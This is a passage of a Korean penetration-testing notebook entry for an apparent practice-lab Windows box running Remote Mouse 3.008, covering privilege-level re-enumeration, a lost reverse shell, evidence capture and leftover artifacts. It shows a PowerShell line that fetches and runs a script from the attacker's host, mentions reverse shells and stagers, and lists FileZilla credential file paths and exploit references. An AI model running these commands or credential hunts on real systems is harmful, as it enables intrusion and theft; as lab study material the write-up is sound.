⚠️ `~/PG/Mice/proof_admin.txt`(579B)는 **캡처가 아니라 손으로 라벨을 붙여 정리한 요약본**임(`whoami:   nt authority\system` 식). `proof.txt` 쪽 1차 증거는 스크린샷 하나뿐임. 반면 `proof_user.txt` 는 셸 출력이 그대로 떨어진 진짜 한 화면임.

**권한 레벨마다 열거를 다시 돌려라 — 측정된 사실.** SYSTEM cmd 를 잡은 뒤 **같은 `harvest.ps1` 을 그대로 다시 돌렸음.**

![[PG-Mice-harvest-system-9282.png]]

```powershell
C:\>powershell -ep bypass -c "iex(irm http://192.168.45.207/harvest.ps1)"
HARVEST_DONE C:\WINDOWS\TEMP\harvest_REMOTE-PC.txt

C:\>powershell -c "(gc C:\Windows\Temp\harvest_REMOTE-PC.txt).Count; gc C:\Windows\Temp\harvest_REMOTE-PC.txt | Select-Object -Last 4"
9282
Successfully processed 0 files; Failed processing 1 files

===== DONE =====
harvest complete -> C:\WINDOWS\TEMP\harvest_REMOTE-PC.txt
```
— 출처: `파일보관\PG-Mice-harvest-system-9282.png` 전사

**divine 6,692행 → SYSTEM 9,282행, 차이 2,590행.** `Select-Object -Last 4` 가 `===== DONE =====` 마커를 보여주므로 스크립트가 중간에 죽어서 짧았던 것이 아님. 저권한에서는 서비스 DACL·다른 사용자 프로필·레지스트리 하이브·예약작업 상세가 **조용히 잘려서** 돌아옴 — 에러가 아니라 그냥 빈 줄로 옴.

**원시 터미널 캡처가 없는 이유.** 죽어 있던 것은 **타겟 → Kali 파일 회수 채널**임. GUI 아이콘을 되살리려고 `logoff` 후 `shutdown /r` 을 쓰면서 nc 리버스셸이 같이 죽었고(`shell443.log` 마지막 기록 23:27:14), 재부팅 뒤 평문 스테이저(`r.ps1`)를 두 번 다시 던졌으나 콜백이 없었음(`rce_retry.log` 23:39 · `shell443b.log` 23:43 은 `listening on [any] 443 ...` 한 줄뿐). 그래서 SYSTEM 획득(00:05) 이후 작업은 **RDP GUI 안에서만** 이뤄졌고, SYSTEM cmd 의 출력을 파일로 빼낼 경로가 없었음.

빼내려는 시도도 실패했음 — `~/PG/Mice/rdp44.png` 에 남은 것은 GUI 로 타이핑한 `ReadAllBytes(...)` 원라이너가 이스케이프가 깨져(`\x27`) 파서 에러로 죽은 화면임. `harvest_admin.txt` 가 **0바이트**인 것이 그 흔적임 — 빈 파일이 아니라 「빈 응답을 받았다」는 기록.

Kali 쪽은 그동안 살아 있었음 — `~/PG/Mice/rdp41~44.png` 가 00:05:12~00:11:20 에, `harvest_admin.txt` 가 00:10:35 에 Kali 에 기록됐고 `http.log` 에도 `[21/Aug/2026 00:08:08] "GET /harvest.ps1"` 이 남음. 끊긴 것은 Kali 접속이 아니라 **타겟에서 Kali 로 파일을 밀어 올릴 채널**이었음.

증거 회수 경로(파일 exfil)와 조작 경로(GUI)가 **다른 채널**일 때, 조작 채널만 살아 있으면 증거는 화면에 갇힘. 상위 권한을 잡자마자 가장 먼저 할 일이 증거 한 화면 찍기인 이유임 — 이 박스는 그것만 제때 해둔 덕에 플래그가 인정됐음.

**남긴 흔적** — ⚠️ **삭제를 확인하지 못했다. 박스 정지·리버트로 해소되는 것에 의존한다.**

경위부터 적음. 타겟으로 통하던 nc 리버스셸이 `logoff`·재부팅으로 23:27 에 죽었고 이후 되살아나지 않음. 그 뒤 남은 채널은 RDP GUI 뿐이라 타겟에서 정리 스크립트를 돌릴 수 없었음. Kali 쪽은 따로 정리함 — tmux 8개를 **세션 이름으로만** 종료하고, 고아 리스너 2개는 `ss` 로 **PID 를 특정해** 정리함(광범위 `pkill` 은 쓰지 않았음).

*확인한 것* — 타겟에 올린 파일 없음(스크립트는 전부 `irm` 인메모리 실행), 계정 생성 없음, 설정 변경 없음. Kali 쪽 리스너·tmux 세션은 정리 완료.

*확인 못 한 것* (타겟에 남았을 가능성이 높음):
- 열린 창 — SYSTEM cmd, Remote Mouse Settings, 「다른 이름으로 저장」 대화상자, Edge
- `C:\Windows\Temp\harvest_REMOTE-PC.txt` (SYSTEM harvest, 9,282행)
- `C:\Users\divine\harv.txt` · `C:\Users\divine\pf.txt` (divine 열거 산출물)
- Edge 검색 흔적 — `bing.com/search?q=TESTREBOOT`
- **`shutdown /r` 로 1회 재부팅함**

## 관련

- **CVE-2022-3365** — Remote Mouse Server by Emote Interactive. 기본 암호 + 평문 치환암호 제어 프로토콜을 통한 OS 명령 주입. PoC: **EDB 46697**(RemoteMouse 3.008 - Arbitrary Remote Command Execution). Metasploit `exploit/windows/misc/remote_mouse_rce` 의 References 가 `EDB 46697` + `CVE 2022-3365` 를 나란히 달고 있어 대응 관계가 확정됨
- **CVE-2021-35448** — *"Emote Interactive Remote Mouse 3.008 on Windows allows attackers to execute arbitrary programs as Administrator by using the Image Transfer Folder feature to navigate to cmd.exe. It binds to local ports to listen for incoming connections."* PoC: **EDB 50047**(Remote Mouse GUI 3.008 - Local Privilege Escalation)
- (혼동 주의) **CVE-2021-43326 은 Automox Agent** 취약점 — *"Automox Agent before 32 on Windows incorrectly sets permissions on a temporary directory."* Remote Mouse 와 무관하니 이 박스에 붙이지 말 것
- (배제) **EDB 50258** — Remote Mouse 4.002 Unquoted Service Path. 이 박스는 3.008 이고, `C:\` 루트에 파일을 만들 수 없어 성립하지 않음. 판정 근거는 [[_PLAYBOOK]]
- FileZilla 자격증명 위치 — `%APPDATA%\FileZilla\recentservers.xml` · `sitemanager.xml` (base64)
- 「버전 판정은 독립 근거 2개」 — [[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]]
- 「설정 파일에 남은 자격증명 → 그 암호의 주인을 먼저 확정」 — [[Robust]](Sticky Notes `plum.sqlite` 평문 자격증명)
- [[_PLAYBOOK]] — 이 박스의 시행착오·기법 카드·시험 관점. 개별 항목:
    - [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] — nmap 서비스명의 `?` 는 사전 출력
    - [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] — 타겟에서 egress 를 한 번에 재는 법
    - [[_PLAYBOOK#A-35. AMSI·Defender 가 페이로드를 조용히(또는 요란하게) 막는다]]
    - [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] — 표준 벡터 소거 · 권한별 재열거
    - [[_PLAYBOOK#A-48. RDP 로 붙었는데 트레이 아이콘이 없다 — 세션 토폴로지부터 잰다]]
    - [[_PLAYBOOK#A-49. 헤드리스에서 `The operation was canceled by the user` — 내가 취소한 게 아니다]]
    - [[_PLAYBOOK#A-4-10. 디스크에 남은 PowerShell transcript 가 관리자 스크립트를 가리킨다]]
    - [[_PLAYBOOK#B-26. Remote Mouse 계열 원격제어 앱 — 키입력 주입으로 RCE (CVE-2022-3365 · EDB 46697)]]
    - [[_PLAYBOOK#B-44. unquoted service path 를 봤을 때 잴 것은 «공백»이 아니라 `icacls` 의 `(AD)`·`(IO)`]]
    - [[_PLAYBOOK#B-45. GUI 파일 대화상자 → 상위 권한 cmd]]
    - [[_PLAYBOOK#B-64. Windows 설정 파일 자격증명 사냥 — 그리고 그 암호의 «주인»을 먼저 확정한다]]
- [[_STATUS]] — 283개 전수 진행현황
